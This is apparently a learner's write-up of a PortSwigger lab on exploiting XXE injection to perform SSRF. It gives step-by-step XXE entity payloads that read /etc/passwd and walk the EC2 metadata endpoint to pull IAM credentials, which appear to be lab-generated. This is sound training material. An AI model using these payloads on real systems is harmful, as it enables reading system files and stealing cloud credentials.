<span style="color:yellow;font-weight:700;font-size:30px">
XML external entity (XXE) injection - 4 Labs
</span>

# ***1. Lab: Exploiting XXE to perform SSRF attacks***
https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

**what we know:**
EC2 metadata endpoint -  http://169.254.169.254/

1. test1:
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///"> ]>
  <stockCheck>
  <productId>
  &aparecium;
  </productId>

response: ls of /

2. test2:
<!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "file:///etc/passwd"> ]>

response:
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...

xxe exist - v

3. get data from another server:

```xml
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/"> ]>
  response: "Invalid product ID: latest"
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/"> ]>
  response: "Invalid product ID: meta-data"
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data"> ]>
  response: "Invalid product ID: iam"
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]>
  response: "Invalid product ID: security-credentials"
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials"> ]>
  response: "Invalid product ID: admin"
  <!DOCTYPE mage [ <!ENTITY aparecium SYSTEM "http://169.254.169.254/latest/meta-data/security-credentials/admin"> ]>
```
response: 
```json
  "Invalid product ID: {
    "Code" : "Success",
    "LastUpdated" : "2022-06-14T19:32:05.404485039Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "DyhKrjoWZ3sc7baHwQOz",
    "SecretAccessKey" : "wybIAzOjsBIjJfZobUvkIe3stXf96BH9IZnMEMKH",
    "Token" : "y03qB1O1t6Ecx67K3Rtf41tbLLn3jVU4T82HCHLUUNueNHNRw4jbLTV7qoVOFDSa2Dg5oy0q04etSvN5eEFbSZPpgjCpYKMqugmv0n8cu5JVm0CdBD0sFwihUG0AharGqkz6KxZSkwAMlkGVHkjYUEsrGUkLgksBLqVcK0UmAtUgbXMmj5rWYenmFLJy8pb3En1fHmOyZXJanvzvfiIwZTzm3dqlb3CdfZrK4Ox2KliLpSMsr5iOSvgOQA2erVK7",
    "Expiration" : "2028-06-12T19:32:05.404485039Z"
  }"
```


<!-- assitance materials:
  xxe  explanation:https://portswigger.net/web-security/xxe
  ssrf explanation:https://portswigger.net/web-security/ssrf
  ec2 explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
  IAM role explanation: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/iam-roles-for-amazon-ec2.html -->